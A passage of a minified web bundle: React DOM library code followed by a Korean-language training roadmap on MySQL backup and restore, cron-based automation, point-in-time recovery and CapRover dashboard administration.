t.async!="symbol"&&!t.onLoad&&!t.onError&&t.src&&typeof t.src=="string")return!0}return!1}function Uf(e){return!(e.type==="stylesheet"&&(e.state.loading&3)===0)}function Kh(e,t,a,n){if(a.type==="stylesheet"&&(typeof n.media!="string"||matchMedia(n.media).matches!==!1)&&(a.state.loading&4)===0){if(a.instance===null){var l=qn(n.href),s=t.querySelector(Ol(l));if(s){t=s._p,t!==null&&typeof t=="object"&&typeof t.then=="function"&&(e.count++,e=Xs.bind(e),t.then(e,e)),a.state.loading|=4,a.instance=s,Ve(s);return}s=t.ownerDocument||t,n=Mf(n),(l=Ct.get(l))&&Ac(n,l),s=s.createElement("link"),Ve(s);var i=s;i._p=new Promise(function(c,d){i.onload=c,i.onerror=d}),Je(s,"link",n),a.instance=s}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(a,t),(t=a.state.preload)&&(a.state.loading&3)===0&&(e.count++,a=Xs.bind(e),t.addEventListener("load",a),t.addEventListener("error",a))}}var Cc=0;function Vh(e,t){return e.stylesheets&&e.count===0&&Zs(e,e.stylesheets),0<e.count||0<e.imgCount?function(a){var n=setTimeout(function(){if(e.stylesheets&&Zs(e,e.stylesheets),e.unsuspend){var s=e.unsuspend;e.unsuspend=null,s()}},6e4+t);0<e.imgBytes&&Cc===0&&(Cc=62500*Ah());var l=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&Zs(e,e.stylesheets),e.unsuspend)){var s=e.unsuspend;e.unsuspend=null,s()}},(e.imgBytes>Cc?50:800)+t);return e.unsuspend=a,function(){e.unsuspend=null,clearTimeout(n),clearTimeout(l)}}:null}function Xs(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)Zs(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var Is=null;function Zs(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,Is=new Map,t.forEach(Xh,e),Is=null,Xs.call(e))}function Xh(e,t){if(!(t.state.loading&4)){var a=Is.get(e);if(a)var n=a.get(null);else{a=new Map,Is.set(e,a);for(var l=e.querySelectorAll("link[data-precedence],style[data-precedence]"),s=0;s<l.length;s++){var i=l[s];(i.nodeName==="LINK"||i.getAttribute("media")!=="not all")&&(a.set(i.dataset.precedence,i),n=i)}n&&a.set(null,n)}l=t.instance,i=l.getAttribute("data-precedence"),s=a.get(i)||n,s===n&&a.set(null,l),a.set(i,l),this.count++,n=Xs.bind(this),l.addEventListener("load",n),l.addEventListener("error",n),s?s.parentNode.insertBefore(l,s.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(l,e.firstChild)),t.state.loading|=4}}var kl={$$typeof:P,Provider:null,Consumer:null,_currentValue:H,_currentValue2:H,_threadCount:0};function Ih(e,t,a,n,l,s,i,c,d){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=Ei(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Ei(0),this.hiddenUpdates=Ei(null),this.identifierPrefix=n,this.onUncaughtError=l,this.onCaughtError=s,this.onRecoverableError=i,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=d,this.incompleteTransitions=new Map}function zf(e,t,a,n,l,s,i,c,d,E,D,M){return e=new Ih(e,t,a,i,d,E,D,M,c),t=1,s===!0&&(t|=24),s=dt(3,null,null,t),e.current=s,s.stateNode=e,t=so(),t.refCount++,e.pooledCache=t,t.refCount++,s.memoizedState={element:n,isDehydrated:a,cache:t},ro(s),e}function Bf(e){return e?(e=mn,e):mn}function jf(e,t,a,n,l,s){l=Bf(l),n.context===null?n.context=l:n.pendingContext=l,n=fa(t),n.payload={element:a},s=s===void 0?null:s,s!==null&&(n.callback=s),a=ma(e,n,t),a!==null&&(it(a,e,t),cl(a,e,t))}function Hf(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var a=e.retryLane;e.retryLane=a!==0&&a<t?a:t}}function Oc(e,t){Hf(e,t),(e=e.alternate)&&Hf(e,t)}function Gf(e){if(e.tag===13||e.tag===31){var t=za(e,67108864);t!==null&&it(t,e,67108864),Oc(e,67108864)}}function Qf(e){if(e.tag===13||e.tag===31){var t=gt();t=Ti(t);var a=za(e,t);a!==null&&it(a,e,t),Oc(e,t)}}var $s=!0;function Zh(e,t,a,n){var l=A.T;A.T=null;var s=z.p;try{z.p=2,Dc(e,t,a,n)}finally{z.p=s,A.T=l}}function $h(e,t,a,n){var l=A.T;A.T=null;var s=z.p;try{z.p=8,Dc(e,t,a,n)}finally{z.p=s,A.T=l}}function Dc(e,t,a,n){if($s){var l=kc(n);if(l===null)hc(e,t,n,Ws,a),Kf(e,n);else if(Jh(l,e,t,a,n))n.stopPropagation();else if(Kf(e,n),t&4&&-1<Wh.indexOf(e)){for(;l!==null;){var s=tn(l);if(s!==null)switch(s.tag){case 3:if(s=s.stateNode,s.current.memoizedState.isDehydrated){var i=Ma(s.pendingLanes);if(i!==0){var c=s;for(c.pendingLanes|=2,c.entangledLanes|=2;i;){var d=1<<31-rt(i);c.entanglements[1]|=d,i&=~d}Ut(s),(he&6)===0&&(Ms=ot()+500,Rl(0))}}break;case 31:case 13:c=za(s,2),c!==null&&it(c,s,2),Ns(),Oc(s,2)}if(s=kc(n),s===null&&hc(e,t,n,Ws,a),s===l)break;l=s}l!==null&&n.stopPropagation()}else hc(e,t,n,null,a)}}function kc(e){return e=wi(e),wc(e)}var Ws=null;function wc(e){if(Ws=null,e=en(e),e!==null){var t=R(e);if(t===null)e=null;else{var a=t.tag;if(a===13){if(e=x(t),e!==null)return e;e=null}else if(a===31){if(e=L(t),e!==null)return e;e=null}else if(a===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return Ws=e,null}function Yf(e){switch(e){case"beforetoggle":case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"toggle":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 2;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 8;case"message":switch(qm()){case Wc:return 2;case Jc:return 8;case jl:case Um:return 32;case Pc:return 268435456;default:return 32}default:return 32}}var Mc=!1,Ra=null,Aa=null,xa=null,wl=new Map,Ml=new Map,Ca=[],Wh="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset".split(" ");function Kf(e,t){switch(e){case"focusin":case"focusout":Ra=null;break;case"dragenter":case"dragleave":Aa=null;break;case"mouseover":case"mouseout":xa=null;break;case"pointerover":case"pointerout":wl.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Ml.delete(t.pointerId)}}function Ll(e,t,a,n,l,s){return e===null||e.nativeEvent!==s?(e={blockedOn:t,domEventName:a,eventSystemFlags:n,nativeEvent:s,targetContainers:[l]},t!==null&&(t=tn(t),t!==null&&Gf(t)),e):(e.eventSystemFlags|=n,t=e.targetContainers,l!==null&&t.indexOf(l)===-1&&t.push(l),e)}function Jh(e,t,a,n,l){switch(t){case"focusin":return Ra=Ll(Ra,e,t,a,n,l),!0;case"dragenter":return Aa=Ll(Aa,e,t,a,n,l),!0;case"mouseover":return xa=Ll(xa,e,t,a,n,l),!0;case"pointerover":var s=l.pointerId;return wl.set(s,Ll(wl.get(s)||null,e,t,a,n,l)),!0;case"gotpointercapture":return s=l.pointerId,Ml.set(s,Ll(Ml.get(s)||null,e,t,a,n,l)),!0}return!1}function Vf(e){var t=en(e.target);if(t!==null){var a=R(t);if(a!==null){if(t=a.tag,t===13){if(t=x(a),t!==null){e.blockedOn=t,lr(e.priority,function(){Qf(a)});return}}else if(t===31){if(t=L(a),t!==null){e.blockedOn=t,lr(e.priority,function(){Qf(a)});return}}else if(t===3&&a.stateNode.current.memoizedState.isDehydrated){e.blockedOn=a.tag===3?a.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Js(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var a=kc(e.nativeEvent);if(a===null){a=e.nativeEvent;var n=new a.constructor(a.type,a);ki=n,a.target.dispatchEvent(n),ki=null}else return t=tn(a),t!==null&&Gf(t),e.blockedOn=a,!1;t.shift()}return!0}function Xf(e,t,a){Js(e)&&a.delete(t)}function Ph(){Mc=!1,Ra!==null&&Js(Ra)&&(Ra=null),Aa!==null&&Js(Aa)&&(Aa=null),xa!==null&&Js(xa)&&(xa=null),wl.forEach(Xf),Ml.forEach(Xf)}function Ps(e,t){e.blockedOn===t&&(e.blockedOn=null,Mc||(Mc=!0,o.unstable_scheduleCallback(o.unstable_NormalPriority,Ph)))}var Fs=null;function If(e){Fs!==e&&(Fs=e,o.unstable_scheduleCallback(o.unstable_NormalPriority,function(){Fs===e&&(Fs=null);for(var t=0;t<e.length;t+=3){var a=e[t],n=e[t+1],l=e[t+2];if(typeof n!="function"){if(wc(n||a)===null)continue;break}var s=tn(a);s!==null&&(e.splice(t,3),t-=3,ko(s,{pending:!0,data:l,method:a.method,action:n},n,l))}}))}function zn(e){function t(d){return Ps(d,e)}Ra!==null&&Ps(Ra,e),Aa!==null&&Ps(Aa,e),xa!==null&&Ps(xa,e),wl.forEach(t),Ml.forEach(t);for(var a=0;a<Ca.length;a++){var n=Ca[a];n.blockedOn===e&&(n.blockedOn=null)}for(;0<Ca.length&&(a=Ca[0],a.blockedOn===null);)Vf(a),a.blockedOn===null&&Ca.shift();if(a=(e.ownerDocument||e).$$reactFormReplay,a!=null)for(n=0;n<a.length;n+=3){var l=a[n],s=a[n+1],i=l[et]||null;if(typeof s=="function")i||If(a);else if(i){var c=null;if(s&&s.hasAttribute("formAction")){if(l=s,i=s[et]||null)c=i.formAction;else if(wc(l)!==null)continue}else c=i.action;typeof c=="function"?a[n+1]=c:(a.splice(n,3),n-=3),If(a)}}}function Zf(){function e(s){s.canIntercept&&s.info==="react-transition"&&s.intercept({handler:function(){return new Promise(function(i){return l=i})},focusReset:"manual",scroll:"manual"})}function t(){l!==null&&(l(),l=null),n||setTimeout(a,20)}function a(){if(!n&&!navigation.transition){var s=navigation.currentEntry;s&&s.url!=null&&navigation.navigate(s.url,{state:s.getState(),info:"react-transition",history:"replace"})}}if(typeof navigation=="object"){var n=!1,l=null;return navigation.addEventListener("navigate",e),navigation.addEventListener("navigatesuccess",t),navigation.addEventListener("navigateerror",t),setTimeout(a,100),function(){n=!0,navigation.removeEventListener("navigate",e),navigation.removeEventListener("navigatesuccess",t),navigation.removeEventListener("navigateerror",t),l!==null&&(l(),l=null)}}}function Lc(e){this._internalRoot=e}ei.prototype.render=Lc.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(r(409));var a=t.current,n=gt();jf(a,n,e,t,null,null)},ei.prototype.unmount=Lc.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;jf(e.current,2,null,e,null,null),Ns(),t[Fa]=null}};function ei(e){this._internalRoot=e}ei.prototype.unstable_scheduleHydration=function(e){if(e){var t=nr();e={blockedOn:null,target:e,priority:t};for(var a=0;a<Ca.length&&t!==0&&t<Ca[a].priority;a++);Ca.splice(a,0,e),a===0&&Vf(e)}};var $f=u.version;if($f!=="19.2.0")throw Error(r(527,$f,"19.2.0"));z.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render=="function"?Error(r(188)):(e=Object.keys(e).join(","),Error(r(268,e)));return e=g(t),e=e!==null?k(e):null,e=e===null?null:e.stateNode,e};var Fh={bundleType:0,version:"19.2.0",rendererPackageName:"react-dom",currentDispatcherRef:A,reconcilerVersion:"19.2.0"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var ti=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!ti.isDisabled&&ti.supportsFiber)try{Qn=ti.inject(Fh),ct=ti}catch{}}return ql.createRoot=function(e,t){if(!v(e))throw Error(r(299));var a=!1,n="",l=td,s=ad,i=nd;return t!=null&&(t.unstable_strictMode===!0&&(a=!0),t.identifierPrefix!==void 0&&(n=t.identifierPrefix),t.onUncaughtError!==void 0&&(l=t.onUncaughtError),t.onCaughtError!==void 0&&(s=t.onCaughtError),t.onRecoverableError!==void 0&&(i=t.onRecoverableError)),t=zf(e,1,!1,null,null,a,n,null,l,s,i,Zf),e[Fa]=t.current,pc(e),new Lc(t)},ql.hydrateRoot=function(e,t,a){if(!v(e))throw Error(r(299));var n=!1,l="",s=td,i=ad,c=nd,d=null;return a!=null&&(a.unstable_strictMode===!0&&(n=!0),a.identifierPrefix!==void 0&&(l=a.identifierPrefix),a.onUncaughtError!==void 0&&(s=a.onUncaughtError),a.onCaughtError!==void 0&&(i=a.onCaughtError),a.onRecoverableError!==void 0&&(c=a.onRecoverableError),a.formState!==void 0&&(d=a.formState)),t=zf(e,1,!0,t,a??null,n,l,d,s,i,c,Zf),t.context=Bf(null),a=t.current,n=gt(),n=Ti(n),l=fa(n),l.callback=null,ma(a,l,n),a=n,t.current.lanes=a,Kn(t,a),Ut(t),e[Fa]=t.current,pc(e),new ei(t)},ql.version="19.2.0",ql}var sm;function c0(){if(sm)return Uc.exports;sm=1;function o(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(o)}catch(u){console.error(u)}}return o(),Uc.exports=o0(),Uc.exports}var r0=c0();const u0={beginner:{title:"초급: 백업이 왜 필요한지 이해하고 수동 백업하기",sections:[{heading:"📚 학습 목표",content:"데이터베이스 백업의 개념과 필요성을 이해하고, mysqldump를 사용하여 수동 백업을 실행할 수 있다."},{heading:"1. 백업이란 무엇인가?",content:"백업은 데이터베이스의 현재 상태를 파일로 저장하는 작업입니다. 서버 장애, 실수로 인한 삭제, 해킹 등의 상황에서 데이터를 복구하기 위한 필수 작업입니다.",list:["사용자가 실수로 DELETE FROM users; 실행 → 모든 회원 데이터 삭제","서버 디스크 고장 → 모든 데이터 영구 손실","랜섬웨어 공격 → 데이터 암호화되어 접근 불가"]},{heading:"2. mysqldump 기본 사용법",code:`# CapRover에서 MySQL 컨테이너에 접속
docker exec -it $(docker ps | grep mysql | awk '{print $1}') bash

# 전체 데이터베이스 백업
mysqldump -u root -p'비밀번호' --all-databases > /backup/full_backup_$(date +%Y%m%d).sql

# 특정 데이터베이스만 백업
mysqldump -u root -p'비밀번호' cms_database > /backup/cms_backup.sql

# 백업 파일을 호스트로 복사
docker cp mysql_container:/backup/cms_backup.sql ./backups/`},{heading:"3. 백업 파일 확인하기",content:"백업 파일은 SQL 문으로 이루어진 텍스트 파일입니다:",code:`head -20 cms_backup.sql
# 출력 예시:
# -- MySQL dump 10.13
# CREATE TABLE users (
#   id int PRIMARY KEY,
#   username varchar(50),
#   ...
# );
# INSERT INTO users VALUES (1, 'admin', ...);`},{heading:"4. 실습: 첫 백업 실행하기",steps:[{label:"Step 1",text:"CapRover 대시보드 → Apps → MySQL → 터미널 접속"},{label:"Step 2",text:"백업 디렉토리 생성",code:"mkdir -p /backup"},{label:"Step 3",text:"백업 실행",code:"mysqldump -u root -p$MYSQL_ROOT_PASSWORD cms_database > /backup/my_first_backup.sql"},{label:"Step 4",text:"백업 확인",code:`ls -lh /backup/
# 출력: -rw-r--r-- 1 mysql mysql 15M Jan 15 10:30 my_first_backup.sql`,note:"파일 크기가 0보다 크면 성공!"}]},{heading:"5. 백업 파일 보관하기",content:"백업 파일은 데이터베이스 서버와 다른 장소에 보관해야 합니다:",list:["로컬 컴퓨터에 다운로드","클라우드 스토리지 (Google Drive, AWS S3)","외부 서버"],code:`# CapRover 호스트에서 실행
docker cp $(docker ps | grep mysql | awk '{print $1}'):/backup/my_first_backup.sql ~/safe_location/`},{heading:"⚠️ 주의사항",list:["백업 파일에는 비밀번호 등 민감정보가 포함되어 있습니다","백업 파일 권한을 600으로 제한: chmod 600 backup.sql","정기적으로 백업 파일이 복구 가능한지 테스트하세요"]},{heading:"✅ 체크리스트",checklist:["mysqldump 명령어로 백업 실행 성공","백업 파일 크기 확인 (0보다 커야 함)","백업 파일을 안전한 장소에 복사","백업 파일을 텍스트 에디터로 열어 내용 확인"],nextStep:"이 백업을 실제로 복구하는 방법을 배우고, 백업을 자동화하는 방법을 익힙니다."}]},intermediate:{title:"중급: 백업 자동화하고 복구 시나리오 대비하기",sections:[{heading:"📚 학습 목표",content:"Cron을 사용하여 백업을 자동화하고, 다양한 복구 시나리오에 대비할 수 있다."},{heading:"1. 백업 자동화가 필요한 이유",content:"수동 백업의 문제점:",list:["깜빡하고 잊어버림 → 장애 발생 시 복구 불가","백업 주기가 불규칙 → 최신 데이터 손실 위험","사람이 직접 해야 함 → 시간 낭비"]},{heading:"2. 백업 스크립트 작성",code:`#!/bin/bash
# /backup/mysql_backup.sh

DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_DIR="/backup"
DB_NAME="cms_database"
KEEP_DAYS=7

# 백업 실행
mysqldump -u root -p$MYSQL_ROOT_PASSWORD   --single-transaction   --routines   --triggers   $DB_NAME > $BACKUP_DIR/backup_$DATE.sql

# 압축하여 공간 절약
gzip $BACKUP_DIR/backup_$DATE.sql

# 7일 이상 된 백업 삭제
find $BACKUP_DIR -name "backup_*.sql.gz" -mtime +$KEEP_DAYS -delete

echo "Backup completed: backup_$DATE.sql.gz"`},{heading:"3. Cron 설정하기",steps:[{label:"Step 1",text:"스크립트 실행 권한 부여",code:"chmod +x /backup/mysql_backup.sh"},{label:"Step 2",text:"Cron 편집기 열기",code:"crontab -e"},{label:"Step 3",text:"매일 새벽 2시에 백업 실행",code:"0 2 * * * /backup/mysql_backup.sh >> /var/log/backup.log 2>&1"},{label:"Step 4",text:"Cron 작업 확인",code:"crontab -l"}]},{heading:"4. 복구 테스트",content:"백업은 복구할 수 있어야 의미가 있습니다. 반드시 테스트하세요!",steps:[{label:"테스트 DB 생성",code:"mysql -u root -p -e 'CREATE DATABASE test_restore;'"},{label:"백업 파일 복구",code:"gunzip < backup_20250104_020001.sql.gz | mysql -u root -p test_restore"},{label:"데이터 확인",code:"mysql -u root -p test_restore -e 'SHOW TABLES;'"},{label:"테스트 DB 삭제",code:"mysql -u root -p -e 'DROP DATABASE test_restore;'"}]},{heading:"✅ 자동화 체크리스트",checklist:["백업 스크립트가 정상 실행되는가?","Cron이 설정된 시간에 작동하는가?","오래된 백업이 자동 삭제되는가?","복구 테스트가 성공했는가?"]}]},advanced:{title:"고급: 증분 백업과 Point-in-Time 복구",sections:[{heading:"📚 학습 목표",content:"Binary Log를 활용한 증분 백업과 특정 시점으로 복구하는 방법을 익힙니다."},{heading:"1. Binary Log란?",content:"MySQL의 모든 데이터 변경 사항(INSERT, UPDATE, DELETE)을 기록하는 로그입니다. 이를 활용하면:",list:["전체 백업 + Binary Log = 어떤 시점으로든 복구 가능","디스크 공간 절약 (전체 백업은 하루 1회, 증분은 계속)","사용자가 실수한 직전 시점으로 복구"]},{heading:"2. Binary Log 활성화",content:"CapRover MySQL 컨테이너의 my.cnf 설정:",code:`[mysqld]
server-id = 1
log_bin = /var/log/mysql/mysql-bin.log
expire_logs_days = 7
max_binlog_size = 100M

# 컨테이너 재시작 필요
docker restart $(docker ps | grep mysql | awk '{print $1}')`},{heading:"3. Point-in-Time 복구 시나리오",content:"예시: 오후 3시에 실수로 DELETE 쿼리 실행, 마지막 전체 백업은 새벽 2시",steps:[{label:"Step 1",text:"새벽 2시 전체 백업 복구",code:"mysql -u root -p cms_database < backup_20250104_020000.sql"},{label:"Step 2",text:"Binary Log에서 2시~3시 사이의 변경사항 추출",code:`mysqlbinlog --start-datetime='2025-01-04 02:00:00' \\
  --stop-datetime='2025-01-04 14:59:59' \\
  /var/log/mysql/mysql-bin.000001 > incremental.sql`},{label:"Step 3",text:"증분 복구 적용",code:"mysql -u root -p cms_database < incremental.sql"},{label:"결과",text:"오후 3시 직전 상태로 완벽 복구!"}]},{heading:"4. 실전 복구 플레이북",content:"긴급 상황 대응 절차:",checklist:["즉시 서비스 중지 (추가 손상 방지)","현재 데이터베이스 전체 덤프 (현재 상태 보존)","가장 최근 전체 백업 확인","Binary Log 위치 확인","테스트 환경에서 복구 시뮬레이션","성공 확인 후 프로덕션 복구","서비스 재개 및 데이터 검증"]},{heading:"5. 고급 백업 전략",list:["3-2-1 규칙: 3개 복사본, 2개 다른 미디어, 1개 오프사이트","핫 백업(실시간) vs 콜드 백업(서비스 중지)","레플리카 서버 활용 (읽기 부하 분산 + 백업 소스)","클라우드 백업 자동화 (AWS S3, Google Cloud Storage)"]},{heading:"⚡ 고급 실습 과제",checklist:["Binary Log를 활성화하고 5분 후 특정 레코드 삭제 후 복구","백업 파일을 S3에 자동 업로드하는 스크립트 작성","복구 시간 목표(RTO) 1시간 이내 달성 가능한지 테스트","재해 복구 문서(Disaster Recovery Plan) 작성"]}]}},im={tiers:[{id:"tier1",name:"Tier 1: 긴급 생존 기술",period:"1~2주, 필수",color:"bg-red-100 border-red-300 text-red-800",reason:"서비스가 다운되거나 데이터가 날아갔을 때 복구하기 위해",topics:[{id:"1-1",name:"백업 & 복구 시스템",goal:"데이터를 안전하게 보관하고 문제 시 복구할 수 있다",hours:5,keywords:["mysqldump","mysql import","cron","backup strategy"],tasks:["MySQL 수동 백업 3회 실행","백업 파일로 테스트 DB 복구","자동 백업 스크립트 작성 및 테스트"],content:u0},{id:"1-2",name:"CapRover 대시보드 마스터",goal:"CapRover를 통해 시스템 상태를 파악하고 기본 조치를 할 수 있다",hours:3,keywords:["CapRover","Docker container","application monitoring"],tasks:["각 앱의 로그 10분씩 관찰","의도적으로 앱 중지 후 재시작","환경변수 하나 변경하고 재배포"],content:{beginner:{title:"초급: CapRover 인터페이스 익히기",sections:[{heading:"📚 학습 목표",content:"CapRover 대시보드의 주요 메뉴를 이해하고, 앱의 상태를 파악할 수 있다."},{heading:"1. CapRover란?",content:"CapRover는 Docker 기반의 오픈소스 PaaS(Platform as a Service)입니다. Heroku처럼 쉽게 앱을 배포하지만, 자신의 서버에서 완전한 제어권을 갖습니다.",list:["무료 오픈소스 (Heroku는 유료)","Git push만으로 자동 배포","무중단 배포, SSL 인증서 자동 발급","하나의 서버에서 여러 앱 관리"]},{heading:"2. 대시보드 주요 메뉴 둘러보기",steps:[{label:"Apps",text:"배포된 앱 목록 (MySQL, Redis, PHP 백엔드, React 프론트엔드 등)"},{label:"Monitoring",text:"NetData 연동 - CPU, 메모리, 디스크, 네트워크 실시간 그래프"},{label:"Cluster",text:"서버(노드) 관리 - 여러 서버를 클러스터로 묶을 수 있음"},{label:"Settings",text:"시스템 설정 - 도메인, SSL, 비밀번호 변경 등"}]},{heading:"3. 앱 상태 확인하기",content:"Apps 메뉴에서 각 앱의 상태를 확인할 수 있습니다:",list:["초록불: 정상 실행 중 (Running)","회색: 중지됨 (Stopped)","빨강: 에러 발생 (Error/Crashed)"],code:`# 앱을 클릭하면 볼 수 있는 정보:
- Instance Count: 실행 중인 컨테이너 수
- Memory Limit: 메모리 제한 (기본 512MB)
- Port Mapping: 포트 설정
- Environment Variables: 환경 변수 (DB 비밀번호 등)
- Logs: 최근 로그 100줄`},{heading:"4. 실습: 앱 로그 10분간 관찰하기",steps:[{label:"Step 1",text:"Apps → MySQL 앱 클릭"},{label:"Step 2",text:"App Logs 탭으로 이동"},{label:"Step 3",text:"Auto Refresh 활성화 (우측 상단 토글)"},{label:"관찰 포인트",text:"어떤 쿼리가 실행되는가? 에러 메시지는 없는가?"}]},{heading:"5. HTTP Settings 이해하기",content:"각 앱의 HTTP Settings에서 도메인과 SSL을 설정합니다:",code:`# 예시:
- Enable HTTPS: 체크 (Let's Encrypt 자동 SSL)
- Container HTTP Port: 80 (앱이 리스닝하는 포트)
- Force HTTPS: 체크 (HTTP → HTTPS 리다이렉트)
- Custom Domain: cms.example.com`},{heading:"✅ 초급 체크리스트",checklist:["각 앱의 상태(초록/회색/빨강) 확인","MySQL, Redis, 백엔드, 프론트엔드 로그를 각각 10분씩 관찰","앱 하나의 Environment Variables 확인","Monitoring 메뉴에서 CPU/메모리 그래프 확인"]}]},intermediate:{title:"중급: 컨테이너 라이프사이클과 문제 해결",sections:[{heading:"📚 학습 목표",content:"컨테이너를 중지/재시작하고, 환경변수를 변경하여 앱 동작을 제어할 수 있다."},{heading:"1. 컨테이너 라이프사이클",content:"컨테이너는 생명주기를 가진 프로세스입니다:",list:["Created: 이미지로부터 생성됨","Running: 실행 중 (앱이 작동하는 상태)","Stopped: 중지됨 (데이터는 보존)","Restarting: 재시작 중","Dead: 비정상 종료"]},{heading:"2. 실습: 의도적으로 앱 중지 후 재시작",steps:[{label:"Step 1",text:"테스트용 앱 선택 (프론트엔드 추천)",code:"Apps → React 앱 클릭"},{label:"Step 2",text:"앱 중지하기",code:"우측 상단 ... 메뉴 → Stop"},{label:"Step 3",text:"브라우저에서 사이트 접속 → 502 Bad Gateway 확인"},{label:"Step 4",text:"앱 재시작",code:"... 메뉴 → Start"},{label:"Step 5",text:"30초 대기 후 사이트 정상 작동 확인"}]},{heading:"3. 환경변수 변경하기",content:"환경변수는 앱의 설정값입니다 (DB 주소, API 키 등). 변경 시 재배포가 필요합니다.",steps:[{label:"예시",text:"백엔드 앱의 디버그 모드 활성화",code:`# App Config 탭 → Environment Variables
KEY: DEBUG
VALUE: true

# Save & Update 클릭 → 자동 재배포 시작`}]},{heading:"4. 로그로 문제 진단하기",content:"앱이 제대로 시작하지 않을 때:",list:["App Logs에서 에러 메시지 확인","환경변수 오타 확인 (DB_HOST vs DATABASE_HOST)","포트 충돌 확인 (같은 포트를 2개 앱이 사용)","메모리 부족 (앱이 반복적으로 재시작)"],code:`# 흔한 에러 예시
Error: connect ECONNREFUSED 127.0.0.1:3306
→ MySQL이 중지되었거나 연결 정보가 틀림

FATAL: could not allocate memory
→ 메모리 제한 초과, App Config에서 메모리 증가 필요`},{heading:"5. 재배포(Redeploy) 이해하기",content:"다음 경우에 재배포가 필요합니다:",list:["환경변수 변경","코드 업데이트 (Git push)","컨테이너 설정 변경 (메모리, 포트 등)"],code:`# 재배포 과정:
1. 새 컨테이너 생성 (새로운 설정 적용)
2. 헬스체크 통과 확인
3. 기존 컨테이너 트래픽 차단
4. 새 컨테이너로 트래픽 전환
5. 기존 컨테이너 종료

→ 무중단 배포(Zero Downtime Deployment)`},{heading:"✅ 중급 체크리스트",checklist:["앱 중지 → 재시작 성공","환경변수 하나 변경 후 재배포 성공","로그에서 에러 메시지 찾아 해석","재배포 과정에서 사이트 접속 테스트 (무중단 확인)"]}]},advanced:{title:"고급: 무중단 배포와 스케일링",sections:[{heading:"📚 학습 목표",content:"앱을 스케일 아웃하여 트래픽을 분산하고, 무중단 배포를 완벽히 이해한다."},{heading:"1. 스케일링이란?",content:"트래픽이 증가하면 서버를 확장해야 합니다:",list:["Scale Up (수직 확장): 서버의 CPU/메모리 증가","Scale Out (수평 확장): 같은 앱의 컨테이너를 여러 개 실행"],code:`# CapRover는 Scale Out을 쉽게 지원
App Config → Instance Count: 3
→ 같은 앱이 3개 컨테이너로 실행
→ 트래픽은 자동으로 로드밸런싱`},{heading:"2. 실습: 앱 스케일 아웃",steps:[{label:"Step 1",text:"백엔드 앱의 Instance Count를 3으로 변경"},{label:"Step 2",text:"Save & Update → 3개 컨테이너 생성 확인"},{label:"Step 3",text:"Monitoring에서 메모리 사용량 증가 확인"},{label:"Step 4",text:"로그에서 3개 컨테이너의 다른 로그 확인",note:"요청이 각 컨테이너에 분산됨"}]},{heading:"3. 로드밸런싱 전략",content:"CapRover는 Nginx로 로드밸런싱을 수행합니다:",list:["Round Robin: 순서대로 요청 분배 (기본값)","Least Connections: 연결이 적은 컨테이너 우선","IP Hash: 같은 IP는 같은 컨테이너로 (세션 유지)"],code:`# 고급 설정 (Nginx Config Override)
upstream backend {
  least_conn;
  server container1:3000;
  server container2:3000;
  server container3:3000;
}`},{heading:"4. 헬스체크와 자동 복구",content:"CapRover는 컨테이너 상태를 주기적으로 확인합니다:",code:`# App Config → Health Check Path
/health

# 백엔드에서 헬스체크 엔드포인트 구현
GET /health
Response: { "status": "ok", "timestamp": 1234567890 }

# 헬스체크 실패 시:
1. 해당 컨테이너로 트래픽 차단
2. 3번 재시도
